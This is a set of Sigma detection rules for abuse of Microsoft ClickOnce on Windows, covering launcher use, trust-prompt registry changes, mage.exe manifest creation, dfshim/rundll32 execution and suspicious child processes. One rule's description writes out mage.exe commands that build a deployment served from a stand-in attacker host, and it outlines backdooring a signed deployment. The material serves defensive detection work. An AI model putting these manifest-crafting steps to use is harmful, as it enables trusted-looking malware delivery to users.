# Arquivo: A.yml
title: ClickOnce Abuse and Suspicious ClickOnce Launcher Activity
id: 1f8c3b2a-2026-clickonce-abuse-0001
status: experimental
description: Detects suspicious ClickOnce usage patterns abused to execute trusted code (e.g., dfsvc.exe, dfshim.dll/rundll32 invocations, execution of .application manifests from user AppData ClickOnce cache) and follow-on suspicious child processes (PowerShell, cmd, mshta, rundll32). Useful for identifying attackers abusing ClickOnce to bypass SmartScreen and execute payloads under a trusted Windows mechanism.
author: Detection Engineer
date: 2026-06-06
references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
logsource:
  product: windows
  service: sysmon
  category: process_creation
detection:
  selection_clickonce_launcher:
    EventID: 1
    Image|re:
      - '(?i)\\dfsvc\.exe$'
      - '(?i)\\rundll32\.exe$'
    CommandLine|re:
      - '(?i)\bdfshim\.dll\b'
      - '(?i)\bShOpenVerbApplication\b'
      - '(?i)\.application\b'
  selection_clickonce_cache_exec:
    EventID: 1
    Image|re:
      - '(?i)\\AppData\\Local\\Apps\\2\.0\\'
      - '(?i)\\AppData\\Local\\Apps\\Published\\'
    CommandLine|re:
      - '(?i)\.application\b'
      - '(?i)\.manifest\b'
  selection_suspicious_children:
    EventID: 1
    ParentImage|re:
      - '(?i)\\dfsvc\.exe$'
      - '(?i)\\rundll32\.exe$'
    Image|re:
      - '(?i)\\powershell\.exe$'
      - '(?i)\\pwsh\.exe$'
      - '(?i)\\cmd\.exe$'
      - '(?i)\\mshta\.exe$'
      - '(?i)\\wscript\.exe$'
      - '(?i)\\cscript\.exe$'
  selection_browser_parent:
    EventID: 1
    ParentImage|re:
      - '(?i)\\(chrome|firefox|msedge|iexplore)\.exe$'
    CommandLine|re:
      - '(?i)\.application\b'
  condition: selection_clickonce_launcher or selection_clickonce_cache_exec or selection_suspicious_children or selection_browser_parent
fields:
  - timestamp
  - EventID
  - ComputerName
  - SubjectUserName
  - Image
  - ParentImage
  - CommandLine
  - ProcessId
  - ParentProcessId
falsepositives:
  - Legitimate ClickOnce application installs and updates initiated by users or enterprise software distribution.
  - Developer or QA activity that runs ClickOnce manifests from the AppData cache.
level: high
tags:
  - attack.execution
  - attack.defense_evasion
  - attack.persistence
  - technique.T1218.011
  - windows.clickonce
notes: |
  - Tune by whitelisting known ClickOnce application publishers, developer machines, and enterprise deployment tools.
  - Investigate alerts by collecting the ClickOnce manifest/.application file, publisher/signature details, parent process chain, and any downloaded payloads; check for unusual network connections or subsequent persistence modifications.
  - Mitigation: restrict ClickOnce usage where not required, monitor dfsvc.exe/rundll32 activity, and validate publisher signatures for ClickOnce applications.


---
# Arquivo: B.yml
title: ClickOnce Trust Prompt Tampering
id: ac9159cc-c364-4304-8f0a-d63fc1a0aabb
status: test
description: Detects changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet.
references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  - https://learn.microsoft.com/en-us/visualstudio/deployment/how-to-configure-the-clickonce-trust-prompt-behavior
author: OpenAI
date: 2026-06-05
tags:
  - attack.persistence
  - attack.defense_evasion
  - attack.t1112
logsource:
  category: registry_set
  product: windows
detection:
  selection:
    TargetObject|contains: '\SOFTWARE\MICROSOFT\.NETFramework\Security\TrustManager\PromptingLevel\'
    TargetObject|endswith:
      - '\Internet'
      - '\LocalIntranet'
      - '\MyComputer'
      - '\TrustedSites'
      - '\UntrustedSites'
    Details: 'Enabled'
  condition: selection
fields:
  - TargetObject
  - Details
  - Image
  - User
  - Computer
falsepositives:
  - Legitimate internal requirements
level: medium

---
# Arquivo: C.yml
title: Weaponized ClickOnce Manifest Generation via Mage.exe Outside Visual Studio Pipeline
id: f29a7c41-8b3e-4d17-bc94-1e5f0a6d38b2
status: experimental
description: |
    Detects use of mage.exe (Microsoft Manifest Generation and Editing Tool) to create
    or sign ClickOnce deployment or application manifests outside of a legitimate Visual
    Studio build pipeline, as documented by SpecterOps in "Less SmartScreen More Caffeine:
    (Ab)Using ClickOnce for Trusted Code Execution" (DEF CON 30, 2023).

    Mage.exe is the tool adversaries must use to craft ClickOnce manifests when:

    (A) Backdooring an existing signed third-party ClickOnce deployment — The attacker
        strips manifest signing metadata (publicKeyToken nulled to 16 zeros,
        <publisherIdentity> removed, <hash> block deleted) and uses mage.exe to rebuild
        the .application deployment manifest so dfsvc.exe can parse it. The host .NET
        assembly retains its valid EV code signature and SmartScreen reputation; only
        the unsigned dependency DLL carrying the backdoor is new.

    (B) Wrapping an arbitrary .NET assembly as a new ClickOnce deployment — The attacker
        identifies a .NET assembly that lacks an <assemblyIdentity> in its embedded
        manifest and has UAC set to asInvoker (using AssemblyHunter), then runs:

          mage.exe -New Application -Processor amd64 -ToFile App.exe.manifest \
                   -name "TargetApp" -Version 1.0.0.0 -FromDirectory .
          mage.exe -New Deployment -Processor amd64 -Install false \
                   -ProviderUrl "http://attacker.tld/dist/App.application" \
                   -AppManifest App.exe.manifest -ToFile App.application

        This produces a fresh .application / .exe.manifest pair that dfsvc.exe will
        consume and execute, sideloading the backdoored dependency DLL.

    In a legitimate software development workflow, mage.exe is only ever called from:
      - MSBuild.exe (Visual Studio automated ClickOnce publish)
      - devenv.exe  (IDE-initiated publish)
      - A CI/CD agent (AzureDevOps, Jenkins) running inside a build directory

    Invocation from any other parent (cmd.exe, powershell.exe, explorer.exe, a user
    shell) at a path outside the Windows SDK or .NET SDK installation directories is
    anomalous and warrants immediate investigation.

    Note on the existing community rule (proc_creation_win_dfsvc_suspicious_child_processes,
    id: 67bc0e75-c0a9-4cfc-8754-84a505b63c04): that rule detects post-exploitation
    child processes of dfsvc.exe. This rule fires earlier — at manifest *preparation*
    time on the attacker-controlled host — and is complementary, not overlapping.

references:
    - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
    - https://securityboulevard.com/2023/06/less-smartscreen-more-caffeine-abusing-clickonce-for-trusted-code-execution/
    - https://attack.mitre.org/techniques/T1127/002/
    - https://learn.microsoft.com/en-us/dotnet/framework/tools/mage-exe-manifest-generation-and-editing-tool
author: Generated from SpecterOps "Less SmartScreen More Caffeine" (Nick Powers / Steven Flores, DEF CON 30 / 2023)
date: 2023-06-07
tags:
    - attack.execution
    - attack.t1127.002   # Trusted Developer Utilities Proxy Execution: ClickOnce
    - attack.defense_evasion
    - attack.t1553.002   # Subvert Trust Controls: Code Signing (abusing existing signed assembly)
    - attack.t1036.005   # Masquerading: Match Legitimate Name or Location
    - attack.initial_access
    - attack.t1566        # Phishing (ClickOnce as initial access payload delivery)
    - tlp:white
logsource:
    product: windows
    category: process_creation
    # Requires Sysmon Event ID 1 or equivalent EDR telemetry with ParentImage
    # and full CommandLine capture. Mage.exe ships with the Windows SDK and with
    # .NET Framework developer packs; it is not present on standard end-user systems.
detection:
    # Mage.exe invoked to CREATE a new manifest (the attacker's primary action)
    selection_mage_new:
        Image|endswith: '\mage.exe'
        CommandLine|contains:
            - '-New Application'
            - '-New Deployment'
            - '-new application'
            - '-new deployment'

    # Mage.exe invoked to UPDATE or SIGN an existing manifest
    # (used when the attacker rebuilds a stripped/modified manifest)
    selection_mage_update_sign:
        Image|endswith: '\mage.exe'
        CommandLine|contains:
            - '-Update '
            - '-Sign '
            - '-update '
            - '-sign '

    # Legitimate parents: MSBuild (Visual Studio publish pipeline) and
    # CI/CD agents that run build scripts. These should be baselined and
    # excluded via ParentImage in your environment.
    filter_legitimate_build_parents:
        ParentImage|endswith:
            - '\MSBuild.exe'
            - '\devenv.exe'
            - '\VSIXInstaller.exe'
            - '\dotnet.exe'          # dotnet publish with ClickOnce target
            - '\agent.exe'           # Azure DevOps pipeline agent
            - '\jenkins.exe'

    # Legitimate SDK installation paths — mage.exe running FROM these paths
    # as part of an SDK self-test or toolchain setup is low risk.
    # The threat actor will typically invoke mage.exe by absolute path pointing
    # into a staging/working directory or from a non-SDK path.
    filter_sdk_selftest:
        CurrentDirectory|contains:
            - '\Microsoft SDKs\Windows\'
            - '\Microsoft Visual Studio\'

    condition: >
        (selection_mage_new or selection_mage_update_sign)
        and not filter_legitimate_build_parents
        and not filter_sdk_selftest

falsepositives:
    - A developer manually running mage.exe from a terminal outside their IDE to
      troubleshoot a ClickOnce deployment (common during development). Correlate
      with working-directory proximity to a known source repository.
    - Automated packaging scripts in CI/CD environments that shell out to mage.exe
      directly instead of going through MSBuild — add the CI runner's ParentImage
      to filter_legitimate_build_parents.
    - Security researchers or red teamers using mage.exe on a non-production host
      (expected — use asset classification to scope the rule to production / end-user
      endpoints where developer tools should not be present at all).
    # Recommended tuning: on non-developer endpoints, the presence of mage.exe
    # itself is anomalous. Consider alerting on ANY execution of mage.exe on hosts
    # not in your approved developer workstation group, regardless of parent.
level: high

---
# Arquivo: D.yml
title: ClickOnce Deployment Execution via dfshim.dll
id: 54bfa329-87a1-4322-a6f2-fa7a57a16df3
status: experimental
description: Detects the abuse of the Microsoft ClickOnce deployment engine (dfshim.dll) to download, install, or execute applications from remote or untrusted locations. Adversaries can bypass application whitelisting and SmartScreen controls by proxying execution through rundll32.exe using the ShOpenRegFileW API.
references:
    - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
author: Security Operations Center
date: 2026/06/06
tags:
    - attack.defense_evasion
    - attack.execution
    - attack.t1218.011 # Signed Binary Proxy Execution: Rundll32
logsource:
    product: windows
    category: process_creation
detection:
    selection_rundll:
        Image|endswith: '\rundll32.exe'
        CommandLine|contains: 'dfshim'
    selection_api:
        CommandLine|contains:
            - 'ShOpenRegFileW'
            - 'ShOpenRegFile'
    selection_extension_or_url:
        CommandLine|contains:
            - '.application'
            - 'http://'
            - 'https://'
    condition: selection_rundll and selection_api and selection_extension_or_url
falsepositives:
    - Legitimate enterprise software provisioning installations or updates using ClickOnce deployment technology (e.g., specific banking apps, custom line-of-business tools).
level: high

---
# Arquivo: E.yml
title: Suspicious Child Process from ClickOnce Deployment (dfsvc.exe)
id: e9f7c3b5-1a4b-49f7-9eb2-c5e2a1f8b9d0
status: test
description: Detects when the ClickOnce deployment service (dfsvc.exe) spawns a suspicious child process, which may indicate abuse of ClickOnce for trusted code execution and initial access. This technique is often used to bypass application whitelisting and SmartScreen protections.
references:
  - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_clickonce_trust_prompt.yml
author: '@SerkinValery'
date: 2026-06-05
tags:
  - attack.defense-evasion
  - attack.persistence
  - attack.privilege-escalation
  - attack.t1127.002
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\dfsvc.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\regsvr32.exe'
      - '\rundll32.exe'
      - '\wscript.exe'
  condition: selection
falsepositives:
  - Legitimate ClickOnce applications that require additional scripts or binaries.
level: medium

---
# Arquivo original: image_load_susp_clickonce_unsigned_module_loaded.yml
title: Unsigned Module Loaded by ClickOnce Application
id: 060d5ad4-3153-47bb-8382-43e5e29eda92
status: test
description: Detects unsigned module load by ClickOnce application.
references:
    - https://posts.specterops.io/less-smartscreen-more-caffeine-ab-using-clickonce-for-trusted-code-execution-1446ea8051c5
author: '@SerkinValery'
date: 2023-06-08
tags:
    - attack.privilege-escalation
    - attack.persistence
    - attack.execution
    - attack.stealth
    - attack.t1574.001
logsource:
    category: image_load
    product: windows
detection:
    selection_path:
        Image|contains: '\AppData\Local\Apps\2.0\'
    selection_sig_status:
        - Signed: 'false'
        - SignatureStatus: 'Expired'
    condition: all of selection_*
falsepositives:
    - Unlikely
level: medium

---